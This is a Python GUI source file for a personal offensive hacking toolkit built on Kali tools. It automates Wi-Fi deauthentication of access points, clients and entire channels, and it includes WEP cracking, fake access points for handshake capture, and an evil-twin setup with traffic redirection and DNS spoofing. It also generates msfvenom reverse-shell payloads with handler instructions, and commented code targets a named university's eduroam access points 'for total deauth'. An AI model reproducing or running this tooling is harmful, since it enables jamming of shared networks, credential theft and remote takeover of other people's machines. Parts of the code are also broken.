#!/usr/bin/python3.10

'''
prog_nkb is a gui version of s.n.hvultra supporting various ranges of hacking tools
custom made through basic kali tools and 'violent' python
'''
#!/usr/bin/python
#GUI VERSION
#apt-get instal xdotool (key pressing simulator)

from tkinter import Tk, Label, Button
import os
from datetime import datetime
import subprocess
import pygeoip
import time
import sys

now = datetime.now()
working_directory = '/home/deusxmachina/Documents/scripting/KYS'

# TOOL #1 : sanitize user input by specifying sanitize_input(int, num1) inside the parameter
def sanitize_input(typeof, text):
	def integer(text):
		try:
			text = int(text)
			return "success"
		except:
			return "error"
	def string(text):
		try:
			text = str(text)
			return "success"
		except:
			return "error"
	if typeof == "int":
		return integer(text)
	elif typeof == "str":
		return string(text)

# TOOL #2 : display airodump-ng results and allows user to pick target AP
def pick_ap(netcard, net_user_boot_savefile):
	timeoutSeconds = 10
	lines = []
	os.system('rm -rf '+net_user_boot_savefile)
	print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
	os.system('rm -rf ./1.delete*')
	command1 = 'airodump-ng '+netcard+' 2>&1 | tee '+net_user_boot_savefile
	try:
		subprocess.check_output(command1, shell=True, timeout=timeoutSeconds) # save APs to local file
	except:
		with open(net_user_boot_savefile) as file:
			while (line := file.readline().rstrip()):
				lines.append(line)
	for i in range(0, len(lines)):
		print(str(i)+' : '+lines[i])
	while True:
		choose_ap = input('\n[*] choose line/AP : ')
		if sanitize_input('int', choose_ap) == 'success':
			if int(choose_ap) <= len(lines):
				chosen_ap = str(lines[int(choose_ap)])
				ap_mac_bssid = chosen_ap[1:18]
				ap_channel = chosen_ap[49:50]
				ap_essid = chosen_ap[75:-1]
				break
			else:
				print('[-] Error, please retry')
		else:
			print('[-] Error, please retry')
	return ap_mac_bssid, ap_channel, ap_essid

class prog_nkb:
	global working_directory
	def __init__(self, master):
		self.master = master
		master.title("#@%&^^%!@$%^#$$!@$%^#%&^^%!@$")

		self.label = Label(master, text="____________________KYS_NKB____________________")
		self.label.pack()

		self.option0 = Button(master, text="Today's News", command=self.todays_news)
		self.option0.pack()

		self.option1 = Button(master, text="ip tracker", command=self.ip_tracker)
		self.option1.pack()

		self.option2 = Button(master, text="boot off network", command=self.net_user_boot)
		self.option2.pack()

		self.option3 = Button(master, text="[ WIFI Hacking ]", command=self.wifi_hacks)
		self.option3.pack()

		self.option4 = Button(master, text="msf payload generator", command=self.msf_payload_generator)
		self.option4.pack()

		self.option5 = Button(master, text="mac address changer", command=self.macchanger)
		self.option5.pack()


		''' CREATE NEW BUTTON/FUNCTION
		self.label = Label(master, text="TITLE", font=("Courier"), command=self.FUNCTION)
		self.optionXX.pack()
		'''

		self.exit_button = Button(master, text="exit",  font=("Courier"), command=master.quit)
		self.exit_button.pack()

####################################################################################
####################################################################################
####################################################################################

	def todays_news(self):
		global working_directory
		command1='xterm -hold -e \'python3 '+working_directory+'/W3BS_py3.py\''
		os.system(command1)
		#os.system("sudo -u deusxmachina xterm -hold -e 'play response.mp3'")
		#sudo -u deusxmachina terminator -e "whoami && ping 1.1.1.1 -c 10 && play response.mp3"

####################################################################################
#################################################################################### [ APPROVED ]
####################################################################################

	def ip_tracker(self):
		try:
			x = input('[*] IP : ')
			gip = pygeip.GeoIP('/pygeoip/GeoLiteCity.dat')
			rec = gip.record_by_addr(x)
			for val in rec.items():
				print("%s: %s"  %(val))
		except:
			print('[-] Local error occured')
			os.system('whois '+x)
		print('---code finished---')
		'''
		UPGRADES : have a visual map of the world and pinpoint locations
		'''

####################################################################################
#################################################################################### [ APPROVED* ]
#################################################################################### * everything is good aside from "#???"

	def net_user_boot(self):

		net_user_boot_savefile = './1.delete'+'.'+str(now.month)+'.'+str(now.day)+'.'+str(now.year)+'.'+str(now.minute)+'.'+str(now.second) # save file for airodump output
		net_user_boot_tavefile = './2.delete'+'.'+str(now.month)+'.'+str(now.day)+'.'+str(now.year)+'.'+str(now.minute)+'.'+str(now.second)
		print('\n[+] Displaying all available network cards...')
		time.sleep(0.5)
		os.system('iwconfig | grep wlan')
		netcard = input('[*] monitor-mode capable AP : ')
		os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
		netcard = netcard + 'mon'

		# PICK AP
		chosen_ap  = pick_ap(netcard, net_user_boot_savefile)
		ap_mac_bssid = chosen_ap[0]
		ap_channel = chosen_ap[1]
		ap_essid = chosen_ap[2][0:17]

		# match AP channel number
		os.system('iwconfig '+netcard+' channel '+ap_channel)

		# TARGETTING
		timeoutSeconds2 = 20
		while True:
			a = input('[*] (1) all, (2) whitelist, (3) targeted : ')
			if sanitize_input('int', a) == 'success':
				if int(a) == 1:
					os.system('xterm -e aireplay-ng --deauth 0 -a '+ap_mac_bssid+' '+netcard)
					break
				elif int(a) == 2:
					os.system('') # ???????????????????????????
					break
				elif int(a) == 3:
					# PICK HOST
					print('[+] Scanning target(s)...('+str(timeoutSeconds2)+'s)')
					os.system('rm -rf ./2.delete*')
					mines = []
					command2 = 'airodump-ng '+netcard+' --bssid '+ap_mac_bssid+' 2>&1 | tee '+net_user_boot_tavefile
					try:
						subprocess.check_output(command2, shell=True, timeout=timeoutSeconds2)
					except:
						with open(net_user_boot_tavefile) as file:
							while (line := file.readline().rstrip()):
								mines.append(line)
					for i in range(0, len(mines)):
						print(str(i)+' : '+mines[i])
					while True:
						choose_target = input('\n[*] choose line/target/STATION_column : ')
						if sanitize_input('int', choose_target) == 'success':
							if int(choose_target) <= len(mines):
								chosen_target = str(mines[int(choose_target)])
								tgt_mac = chosen_target[28:46]
								break
							else:
								print('[-] Error, please retry')
						else:
							print('[-] Error, please retry')

					os.system('iwconfig '+netcard+' channel '+ap_channel)
					os.system('xterm -hold -e aireplay-ng --deauth 0 -a '+ap_mac_bssid+' -c '+tgt_mac+' '+netcard)
					break
			else:
				print('[-] Error, please retry')
		os.system('rm -rf ./1.delete* && rm -rf ./2.delete* && airmon-ng stop '+netcard+' && systemctl restart NetworkManager')
		print('---code finished---')

####################################################################################
####################################################################################
####################################################################################

	def wifi_hacks(self):
		global working_directory
		class wifi_hack_framework: 
			def __init__(telf, naster):
				telf.master = naster
				naster.title("#@%&^^%!@$%^#$$!@$%^#%&^^%!@$")

				telf.label = Label(naster, text="____________________WIFI____________________") # WEP, WPA TKIP, WPA2 CCMP
				telf.label.pack()

				telf.option1 = Button(naster, text="WEP", font=("Courier"), command=telf.wep_hack)
				telf.option1.pack()

				telf.option2 = Button(naster, text="Half-Handshake Attack\n(< WPA2 CCMP)", command=telf.wpa2_hack)
				telf.option2.pack()

				telf.option3 = Button(naster, text="WAR DRIVE\n(nested network mass scanner)", command=telf.war_drive)
				telf.option3.pack()

				telf.option4 = Button(naster, text="BLACK OUT\n(cut all wireless coms)", command=telf.blackout)
				telf.option4.pack()

				telf.option5 = Button(naster, text="Evil Twin Attack\n(-sslstrip, only http)", command=telf.eviltwin)
				telf.option5.pack()

			####################################################################################
			#################################################################################### [ APPROVED* ]
			#################################################################################### * everything aside from wep_hack_input 2 and 3 being pass

			def wep_hack(self):
				dump_file = './3.delete'
				print('\n[+] Displaying all available network cards...')
				time.sleep(0.5) ; os.system('iwconfig | grep wlan')
				we_netcard = input('[*] monitor-mode capable AP : ')
				os.system('ifconfig '+we_netcard+' up && airmon-ng start '+we_netcard+' && airmon-ng check kill')
				we_netcard = we_netcard + 'mon'
				
				chosen = pick_ap(we_netcard, dump_file)
				chosen_mac_bssid = chosen[0]
				chosen_channel = chosen[1]
				chosen_essid = chosen[2][0:17]
				wep_hack_file = chosen_essid.rstrip()+str(now.month)+'.'+str(now.day)+'.'+str(now.year)+'.'+str(now.minute)+'.'+str(now.second)

				# pack dump, mass gathering
				# os.system('xterm -hold -e airodump-ng  -c '+chosen_channel+' -w '+wep_hack_file+' --bssid '+chosen_mac_bssid+' '+we_netcard+' &')

				# attack vector
				print('----------------------')
				print('[1] ARP replay attack')
				print('[2] Fragment Attack')
				#print('[3] Evil twin attack (discontinued)')
				print('----------------------')
				wep_hack_input = int(input('[*] attack vector/# : '))
				if wep_hack_input == 1: # arp attack
					os.system('iwconfig '+we_netcard+' channel '+chosen_channel)
					os.system('xterm -e aireplay-ng -1 0 -a '+chosen_mac_bssid+' '+we_netcard+' &')
					os.system('xterm -hold -e aireplay-ng -3 -b '+chosen_mac_bssid+' '+we_netcard)
					print('[+] Once #Data column reaches >= 200,000 close airodump-ng window ')
					print('[+] And crack using # aircrack-ng '+chosen_essid+' ... .cap')
				elif wep_hack_input == 2:
					pass
				elif wep_hack_input == 3:
					pass

				os.system('rm -rf '+dump_file) ; os.system('airmon-ng stop '+we_netcard) ; os.system('systemctl restart NetworkManager')
				print('---code finished---')

			####################################################################################
			#################################################################################### [ NOT APPROVED ! ]
			#################################################################################### automate all the print() orders in the end section

			def wpa2_hack(self): # HALF HANDSHAKE ATTACK
				global working_directory
				dump_file = './4.delete'
				print('\n[+] Detecting available network cards...')
				time.sleep(0.5) ; os.system('iwconfig | grep wlan') ; k = 0
				while k==0:
					try:
						netcard = input('[*] monitor-mode capable AP\n(advised to use INTERNAL card) : ')
						if (a := os.system('iwconfig '+netcard)) == 0: # os.system() return value is 0 when no errors occured
							k=1
						else: print('[-] Error, invalid AP/network card') 
					except:
						print('[-] Error, invalid AP/network card')

				print('\n')
				os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard) # +' && airmon-ng check kill')
				netcard=netcard+"mon" # COMMENT OUT ON CIRCUMSTANCE
				#####################
				timeoutSeconds = 5 # seconds
				#####################
				print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
				lines = []
				command1 = 'airodump-ng '+netcard+' 2>&1 | tee '+dump_file
				try:
					subprocess.check_output(command1, shell=True, timeout=timeoutSeconds) # save APs to local file
				except:
					with open(dump_file) as file:
						while (line := file.readline().rstrip()):
							lines.append(line)
				for i in range(0, len(lines)):
					print(str(i)+' : '+lines[i])
				while True:
					choose_ap = input('\n[*] choose line/AP : ')
					if sanitize_input('int', choose_ap) == 'success':
						if int(choose_ap) <= len(lines):
							chosen_ap = str(lines[int(choose_ap)])
							ap_mac_bssid = chosen_ap[1:18]
							ap_channel = chosen_ap[49:50]
							ap_essid = chosen_ap[75:-1]
							break
						else:
							print('[-] Error, please retry')
					else:
						print('[-] Error, please retry')
				os.system('iwconfig '+netcard+' channel '+ap_channel) ; h = 0 ; word_num = 0 ; j = 0
				try:
					ap_essid_final = ap_essid[0:20]
				except:
					try:
						ap_essid_final = ap_essid[0:19]
					except:
						try:
							ap_essid_final = ap_essid[0:18]
						except:
							try:
								ap_essid_final = ap_essid[0:17]
							except:
								try:
									ap_essid_final = ap_essid[0:16]
								except:
									try:
										ap_essid_final = ap_essid[0:15]
									except:
										try:
											ap_essid_final = ap_essid[0:14]
										except:
											try:
												ap_essid_final = ap_essid[0:13]
											except:
												try:
													ap_essid_final = ap_essid[0:12]
												except:
													try:
														ap_essid_final = ap_essid[0:11]
													except:
														ap_essid_final = ap_essid[0:10]
				# start fake ap on same channel and essid
				passw = 'zero.0pp3rCENT' #### doesn't really matter what password it is
				os.system('iwconfig')
				internet_ap = input('\n[*] network card with access to internet : ')
				os.system('ifconfig '+internet_ap+' up')
				command3 = "xterm -hold -e "+working_directory+"/create_ap/create_ap "+netcard+" "+internet_ap+" \'"+ap_essid_final+"\' "+passw+" &"
				os.system(command3)
				print('\n[+] Started fake ap')
				# chose monitor mode enabled network card here!
				print('[+] Start wireshark, use the following filter :\neapol && (wlan.ta==b0:a4:60:fb:c8:a0 || wlan.da==b0:a4:60:fb:c8:a0)\n(where b0:a4:60:fb:c8:a0 is my device mac addr)\nand then save as a .pcap file')
				print('[*] Optional: start aireplay-ng --deauth 0 -a '+ap_mac_bssid+' wlan2')
				print('[+] Finally, #aircrack-ng -w /usr/share/wordlists/rockyou.txt ./test.pcap') # DONE!

				# touch del.pcap && tshark -i wlan0mon -w del.pcap -a duration:60 && aircrack-ng -w /usr/share/wordlists/rockyou.txt ./del.pcap

				# start Tshark (cli wireshark) with eapol filter, apt install tshark
				'''
				filter = "" ; write_file = "hh_attack"
				command4 = "tshark --color -i "+netcard+" -f "+filter+" -w "+write_file+" -c 1000"
				os.system(command4)
				'''

				#command3 = "xterm -hold -e airbase-ng -e \'"+ap_essid_final+"\' -c "+ap_channel+" "+netcard+" &"
				#os.system(command3)

				# configure packet rerouting on iptables
				'''
				os.system('iwconfig')
				internet_ap = input('\n[*] network card with access to internet : ')
				os.system('ifconfig '+internet_ap+' up')
				os.system("echo \'ifconfig at0 172.16.0.1/16 up\' > iptables.sh")
				os.system("echo \'iptables --flush\' >> iptables.sh")
				os.system("echo \'iptables --table nat --append POSTROUTING --out-interface "+internet_ap+" -j MASQUERADE\' >> iptables.sh")
				os.system("echo \'iptables --append FORWARD --in-interface at0 -j ACCEPT\' >> iptables.sh")
				os.system("echo \'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 172.16.0.1:80\' >> iptables.sh") #HTTP
				os.system("echo \'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 172.16.0.1:443\' >> iptables.sh") #HTTPS
				os.system("echo \'iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 172.16.0.1:53\' >> iptables.sh") #DNS
				os.system("echo \'iptables -t nat -A PREROUTING -p udp --dport 5353 -j DNAT --to-destination 172.16.0.1:5353\' >> iptables.sh") #MDNS
				os.system("echo \'iptables -t nat -A PREROUTING -p udp --dport 1900 -j DNAT --to-destination 172.16.0.1:1900\' >> iptables.sh") #SSDP
				os.system("echo \'iptables -t nat -A PREROUTING -p udp --dport 443 -j DNAT --to-destination 172.16.0.1:443\' >> iptables.sh") #QUIC
				os.system("echo \'iptables -t nat -A PREROUTING -p udp --dport 5223 -j DNAT --to-destination 172.16.0.1:5223\' >> iptables.sh") #??
				os.system("echo \'iptables -t nat -A POSTROUTING -j MASQUERADE\' >> iptables.sh")
				os.system("bash ./iptables.sh")
				os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

				os.system('systemctl stop dnsmasq && xterm -hold -e dnsmasq -C /etc/dnsmasq.d/dhcp.conf -d &')
				os.system('xterm -hold -e dnsspoof -i at0 &')
				os.system('systemctl restart apache2')
				'''
				input('\n[*] PRESS ENTER TO QUIT PROGRAM')

				os.system('airmon-ng stop '+netcard) ; os.system('systemctl restart NetworkManager && iptables --flush && iptables -t nat --flush')
				
				print('---code finished---')
				
			####################################################################################
			#################################################################################### [ NOT APPROVED ]
			####################################################################################

			def war_drive(self): # mass nest network surveillance / control
				dump_file = './4.delete'
				print('\n[+] Detecting available network cards...')
				time.sleep(0.5) ; os.system('iwconfig | grep wlan') ; k = 0
				while k==0:
					try:
						netcard = input('[*] monitor-mode capable AP\n(advised to use EXTERNAL card) : ')
						if (a := os.system('iwconfig '+netcard)) == 0: # os.system() return value is 0 when no errors occured
							k=1
						else: print('[-] Error, invalid AP/network card')
					except:
						print('[-] Error, invalid AP/network card')

				os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
				if netcard == "wlan0":
					netcard=netcard+'mon'
				#elif netcard == 'wlan1':
				#	netcard=netcard+'mon'
				else:
					netcard=netcard #BECAUSE WE ARE USING WLAN1
				
				#===================#			
				timeoutSeconds = 50*60 # seconds
				#===================#

				lines = []
				os.system('rm -rf '+dump_file)
				print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
				#os.system('rm -rf ./4.delete*')
				command1 = 'airodump-ng '+netcard+' --encrypt wep 2>&1 | tee '+dump_file
				try:
					subprocess.check_output(command1, shell=True, timeout=timeoutSeconds) # save APs to local file
				except:
					with open(dump_file) as file:
						while (line := file.readline().rstrip()):
							lines.append(line)
				for i in range(0, len(lines)):
					print(str(i)+' : '+lines[i])

				targets = []
				target_num = input('[*] number of APs\n(assuming they are all on the same channel) : ')
				for j in range(int(target_num)):
					while True:
						choose_ap = input('\n[*] choose line/AP #%d : ' % j)
						if sanitize_input('int', choose_ap) == 'success':
							if int(choose_ap) <= len(lines):
								chosen_ap = str(lines[int(choose_ap)])
								ap_mac_bssid = chosen_ap[1:18]
								ap_channel = chosen_ap[49:50]
								ap_essid = chosen_ap[75:-1]
								break
							else:
								print('[-] Error, please retry')
						else:
							print('[-] Error, please retry')
					targets.append(ap_mac_bssid) ; targets.append(ap_channel) ; targets.append(ap_essid)

				# OPTIONS
				command2 = int(input('\n[*] (1) jam everything, (2), (3) : '))
				if command2 == 1:
					repeat = len(targets) / 3
					os.system('iwconfig '+netcard+' channel '+ap_channel)
					for i in range(int(repeat)):
						rep_bssid = targets[3*i]
						os.system('xterm -hold -e aireplay-ng --deauth 0 -a '+rep_bssid+' '+netcard+' &')
				elif command2 == 2:
					pass
				elif command2 == 3:
					pass
				else:
					print('\n[-] Error')

				input('Press enter to exit WAR DRIVE')

				os.system('airmon-ng stop '+netcard) ; os.system('systemctl restart NetworkManager')
				os.system('rm -rf /home/deusxmachina/4.delete')
				print('---code finished---')
				''' j_hacks()
				os.system('ifconfig wlan1 up')
				os.system('airmon-ng start wlan1 && airmon-ng check kill')
				os.system('iwconfig wlan1mon channel 6')
				os.system('xterm -hold -e aireplay-ng --deauth 0 -a 24:A4:3C:A3:B5:F7 wlan1mon &')
				os.system('xterm -hold -e aireplay-ng --deauth 0 -a 24:A4:3C:99:E6:00 wlan1mon &')
				os.system('xterm -hold -e aireplay-ng --deauth 0 -a 24:A4:3C:A3:B5:94  wlan1mon &')
				'''

			####################################################################################
			#################################################################################### [ APPROVED ]
			####################################################################################

			def blackout(self):
				print('#######################################################################################')
				print('[+] this program will block all wireless commmunications or WIFI on a given channel [+]')
				print('#######################################################################################')
				dump_file = './5.delete'
				kys_file = './5.kys' ; result_file = './5.result' ; result_final_file = './5.resultf'

				# pick a wireless network card (with redundancy)
				print('\n[+] Detecting available network cards...')
				print('##############################################################################################################')
				time.sleep(0.5) ; os.system('iwconfig | grep wlan') ; k = 0
				while k==0:
					try:
						print('##############################################################################################################')
						netcard = input('[*] monitor-mode capable AP\n(advised to use INTERNAL card) : ')
						if (a := os.system('iwconfig '+netcard)) == 0:
							k=1
						else: print('[-] Error, invalid AP/network card')
					except:
						print('[-] Error, invalid AP/network card')

				# start airmon-ng
				if netcard == "wlan0mon":
					print('pass')
				else:
					os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
				if netcard == "wlan0":
					netcard=netcard+"mon"
				else:
					netcard=netcard # for external cards

				# scan target AP(s)
				#####################
				timeoutSeconds = 30 # seconds
				#####################
				print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
				lines = []
				command1 = 'airodump-ng '+netcard+' 2>&1 | tee '+dump_file
				try:
					subprocess.check_output(command1, shell=True, timeout=timeoutSeconds) # save APs to local file
				except:
					with open(dump_file) as file:
						while (line := file.readline().rstrip()):
							lines.append(line)
				for i in range(0, len(lines)):
					print(str(i)+' : '+lines[i])

				# choose target channel
				targets = []
				channel_num = input('[*] channel number to absolutely fuck up : ')
				
				# save relevant AP(s)' bssid to file kys_file
				f = open(kys_file, 'w')
				for j in range(len(lines)):
					if lines[j][49:50] == channel_num:
						targets.append(lines[j])
						#f.write(targets[j][1:18]) # bssid
					else:
						pass
				for k in targets:
					f.write(k[1:18]+'\n')
				f.close()

				# get rid of duplicate bssids and sort
				os.system('sort '+kys_file+' | uniq > '+result_file)

				# execute blackout
				print('iwconfig '+netcard+' channel '+channel_num)
				os.system('iwconfig '+netcard+' channel '+channel_num)
				os.system('sleep 2s')
				f = open(result_file, 'r')
				for l in f:
					l = l.rstrip()
					command3 = 'xterm -hold -e aireplay-ng --deauth 0 -a '+l+' '+netcard+' &'
					print(command3)
					os.system(command3)

				input("\n[*] Press enter to quit program")
				os.system('airmon-ng stop '+netcard) ; os.system('rm -rf '+dump_file+' && rm -rf '+kys_file+' && rm -rf '+result_file+' && rm -rf '+result_final_file+' && systemctl restart NetworkManager')
				print('---code finished---')

			####################################################################################
			#################################################################################### [on-development 2022.03.07]
			####################################################################################

			def eviltwin(self):
				global working_directory
				savefile = "./6.delete"
				print('[*] What this program will automate (instructions) : ')
				print('====== 0. Begin with external wifi card unplugged! This is so that it can grab the name \'wlan0\' \
					 once the original wlan0 changes to wlan0mon')
				print('====== 1. Turn internal wifi card to monitor mode ======')
				os.system('iwconfig')
				eviltwin_fakeAP = input("[+] Select internal wifi card : ")
				os.system('ifconfig '+eviltwin_fakeAP+' up && airmon-ng start '+eviltwin_fakeAP)
				eviltwin_fakeAP = eviltwin_fakeAP+'mon'
				print('====== 2. Connect external wifi adapter NOW!')
				input('[*] Once you see it in ifconfig as wlan0 you can press enter to continue')
				os.system('ifconfig wlan0 up')
				print('====== 3. Choose target AP')
				chosen_ap  = pick_ap(eviltwin_fakeAP, savefile) # retrieve ap chosen from a line number
				ap_mac_bssid = chosen_ap[0]
				ap_channel = chosen_ap[1]
				ap_essid = chosen_ap[2][0:-4] # grab until the End of Line symbol "[\xb01"
				ap_essid = ap_essid[0:31] # max essid length is 32 characters
				
				print('====== 4. CONFIGURING hostapd.conf and dnsmasq.conf')
				os.system('cp '+working_directory+'/eviltwin2022/hostapd.conf ./hostapd.conf.sample') # copy hostapd.conf to local directory, current directory is /home/deusxmachina
				os.system('cp '+working_directory+'/eviltwin2022/dnsmasq.conf ./dnsmasq.conf') # copy dnsmasq.conf to local directory
				os.system('sed s/sampleWifiAP/\''+ap_essid+'\'/g ./hostapd.conf.sample > hostapd.conf.1') # replace essid from sample to currently chosen one
				os.system('sed s/channel=11/channel='+ap_channel+'/g hostapd.conf.1 > hostapd.conf') # replace default channel to currently chosen ap channel
				'''
				sed : 
				-s : search
				-g : global (all matches)
				'''
				print('[*] MAKE SURE db credentials match /var/www/html/dbconnect.php!!!!')
				print('====== 5. ROUTING & NETWORK settings')
				os.system('ifconfig '+eviltwin_fakeAP+' up 10.10.0.1 netmask 255.255.255.0') # set IP to fake AP 
				os.system('route add -net 10.10.0.0 netmask 255.255.255.0 gw 10.10.0.1') # default gateway settings
				os.system('bash '+working_directory+'/eviltwin2022/iptables.sh') # packet routing
				''' iptables.sh 
				iptables --flush
				iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE 
				iptables --append FORWARD --in-interface wlan0mon -j ACCEPT 
				iptables -t nat -A POSTROUTING -j MASQUERADE
				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.10.0.1:80
				#iptables -t nat -A OUTPUT -j DNAT --to-destination 127.0.0.1
				echo 1 > /proc/sys/net/ipv4/ip_forward
				'''
				command1='xterm -hold -e \'hostapd hostapd.conf\' &'
				command2='xterm -hold -e \'dnsmasq -C dnsmasq.conf -d\' &'
				os.system(command1) # start hostapd (fakeAP)
				os.system(command2) # start dnsmasq (DHCP & DNS)
				os.system('systemctl start apache2 && systemctl start mariadb && ufw disable') # disable firewall and start web server and db server
				input("\n[*] AFTER UNPLUGGING EXTERNAL WIFI CARD, Press enter to quit program")
				os.system('airmon-ng stop '+eviltwin_fakeAP) ; os.system('rm -rf '+savefile+' && iptables --flush && iptables -t nat --flush && systemctl restart NetworkManager')
				os.system('rm -rf ./hostapd.conf*')
				os.system('rm -rf ./dnsmasq.conf*')
				print('---code finished---')

			####################################################################################
			####################################################################################
			####################################################################################

		wifi_hack = Tk()
		wifi_hack_gui = wifi_hack_framework(wifi_hack)
		
		w = 220
		h = 240
		ws = nkb.winfo_screenwidth()
		hs = nkb.winfo_screenheight()
		x = (ws/2) - (w/2)
		y = (hs/2) - (h/2)
		
		wifi_hack.geometry('%dx%d+%d+%d' % (w,h,x,y-270))
		time.sleep(0.35)
		wifi_hack.mainloop()
		print('---code finished---')
		
		''' JACOBS UNIVERSITY AP MAC LIST for total deauth
		# cat 4.delete | grep eduroam | grep WPA2 > eduroamAPs.txt
		# python3
		f = open('eduroamAPs.txt', 'r')
		m_list = []
		
		for line in f:
			stripped_line = line.strip()
			line_list = stripped_line.split()
			m_list.append(line_list)
		f.close()
		print(m_list)

		for i in range(len(m_list)):
			os.system('echo '+m_list[i][0]+' >> jacobs_eduroam_6_ap.db')
		os.system('sort jacobs_eduroam_6_ap.db | uniq > RESULTS.txt') # get rid of duplicates
		'''

####################################################################################
#################################################################################### [ APPROVED ]
####################################################################################

	def msf_payload_generator(self):
		
		os.system('ifconfig')
		msfvenom_lhost = input('host ip addr: ')

		i = 1

		while i == 1:
			msfvenom_input = int(input('generating msfvenom payload for windows[0], linux[1], mac[2]: '))
			if msfvenom_input == 0:
				while True:
					msfvenom_input_win = int(input('generating payload for windows normal[0], web delivery[1]: '))
					if msfvenom_input_win == 0:
						print('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + msfvenom_lhost + ' LPORT=4444 -e cmd/powershell_base64 -i 200 -f exe > /home/deusxmachina/payload_%s-%s-%s_%s:%s:%s.exe' % (now.month ,now.day, now.year, now.hour, now.minute, now.second))
						os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + msfvenom_lhost + ' lport=4444 -e cmd/powershell_base64 -i 200 -f exe > /home/deusxmachina/payload_%s-%s-%s_%s:%s:%s.exe' % (now.month ,now.day, now.year, now.hour, now.minute, now.second))
						print("if no errors occured, 'payload_%s-%s-%s_%s:%s:%s.exe' should be created in /home/deusxmachina/" % (now.month, now.day, now.year, now.hour, now.minute, now.second))
						break
					elif msfvenom_input_win == 1:
						print('---IN NEW TERMINAL---')
						print('# msfconosle')
						print('msf> use exploit/multi/sript/web_delivery')
						print('msf> set LHOST '+msfvenom_lhost)
						print('msf> set LPORT 4444')
						print('msf> set target 2')
						print('msf> set payload windows/powershell_reverse_tcp')
						print('msf> exploit')
						print('---RUN output command on target---')
						break
					else:
						print('[-] Wrong input, try again')
				break
			elif msfvenom_input == 1:
				while True:
					msfvenom_input_input1 = int(input('generating payload for linux normal[0], web delivery[1]: '))
					if msfvenom_input_input1 == 0:
						print('msfvenom -p linux/x64/shell/reverse_tcp lhost=' + msfvenom_lhost + ' lport=4444 -f elf > /home/deusxmachina/payload_%s-%s-%s_%s:%s:%s.elf' % (now.month ,now.day, now.year, now.hour, now.minute, now.second))
						os.system('msfvenom -p linux/x64/shell/reverse_tcp lhost=' + msfvenom_lhost + ' lport=4444 -f elf > /home/deusxmachina/payload_%s-%s-%s_%s:%s:%s.elf' % (now.month ,now.day, now.year, now.hour, now.minute, now.second))
						print("if no errors occured, 'payload_%s-%s-%s_%s:%s:%s.elf' should be created in /home/deusxmachina/" % (now.month, now.day, now.year, now.hour, now.minute, now.second))
						break
					elif msfvenom_input_input1 == 1:
						print('---IN NEW TERMINAL---')
						print('# msfconosle')
						print('msf> use exploit/multi/sript/web_delivery')
						print('msf> set LHOST '+msfvenom_lhost)
						print('msf> set LPORT 4444')
						print('msf> set target 0')
						print('msf> set payload python/meterpreter/reverse_tcp')
						print('msf> exploit')
						print('---RUN output command on target---')
						break
					else:
						print('[-] Wrong input, try again')
				break
			elif msfvenom_input == 2:
				while True:
					msfvenom_input_macosx = int(input('generating payload for macosX normal[0], web delivery[1]: '))
					if msfvenom_input_macosx == 0:
						print('msfvenom -p osx/x86/shell_reverse_tcp lhost=' + msfvenom_lhost + ' lport=4444 -e x86/shikata_ga_nai -i 200 -f macho > /home/deusxmachina/shell_%s-%s-%s_%s:%s:%s.macho' % (now.month, now.day, now.year, now.hour, now.minute, now.second))
						os.system('msfvenom -p osx/x86/shell_reverse_tcp lhost=' + msfvenom_lhost + ' lport=4444 -e x86/shikata_ga_nai -i 200 -f macho > /home/deusxmachina/shell_%s-%s-%s_%s:%s:%s.macho' % (now.month, now.day, now.year, now.hour, now.minute, now.second))
						print("if no errors occured, 'payload_%s-%s-%s_%s:%s:%s.macho' should be created in /home/deusxmachina/" % (now.month, now.day, now.year, now.hour, now.minute, now.second))
						break
					elif msfvenom_input_macosx == 1:
						print('---IN NEW TERMINAL---')
						print('# msfconosle')
						print('msf> use exploit/multi/sript/web_delivery')
						print('msf> set LHOST '+msfvenom_lhost)
						print('msf> set LPORT 4444')
						print('msf> set target 0')
						print('msf> set payload python/meterpreter/reverse_tcp')
						print('msf> exploit')
						print('---RUN output command on target---')
						break
					else:
						print('[-] Wrong input, try again')
				break
			else:
				print('[-] You have to input 0 for windows, 1 for linux, or 2 for mac')

		os.system('xdotool key super+t')

		print('\n')
		print('IF you chose normal mode, OPEN new terminal: ')
		print('root> su')
		print('root> msfconsole')
		print('msf> use exploit/multi/handler')
		if msfvenom_input == 0:
			print('msf> set payload windows/meterpreter/reverse_tcp')
		elif msfvenom_input == 1:
			print('msf> set payload linux/x64/meterpreter/reverse_tcp')
		elif msfvenom_input == 2:
			print('msf> set payload osx/x86/shell_reverse_tcp')
		print('msf> set lhost ' + msfvenom_lhost)
		print('msf> set lport 4444')
		print('[AFTER PAYLOAD DELIVERY IS COMPLETE (THROUGH SENDSPACE.COM ETC)]')
		print('msf> exploit')

		print('---code finished---')

####################################################################################
#################################################################################### [ APPROVED ]
####################################################################################

	def macchanger(self):
		print('This is MACChanger')
		while True:
			macchanger_input1 = int(input('[1] Randomly change MAC \n[2] Change to specific MAC(spoofing)\n[3] Change back to original MAC\n[4] MACCHANGER-GTK\n [*] : '))
			macchanger_interface_input = input('[*] AP interface : ')
			if macchanger_input1 == 1:
				os.system('ifconfig '+macchanger_interface_input+' down')
				print('macchanger -r '+macchanger_interface_input)
				os.system('macchanger -r '+macchanger_interface_input)
				break
			elif macchanger_input1 == 2:
				os.system('ifconfig '+macchanger_interface_input+' down')
				macchanger_input_specific = raw_input('MAC addr to spoof: ')
				os.system('macchanger -m '+macchanger_input_specific+' '+macchanger_interface_input)
				os.system('ifconfig '+macchanger_interface_input+' up')
				print('#service network-manager restart')
				os.system('service network-manager restart')
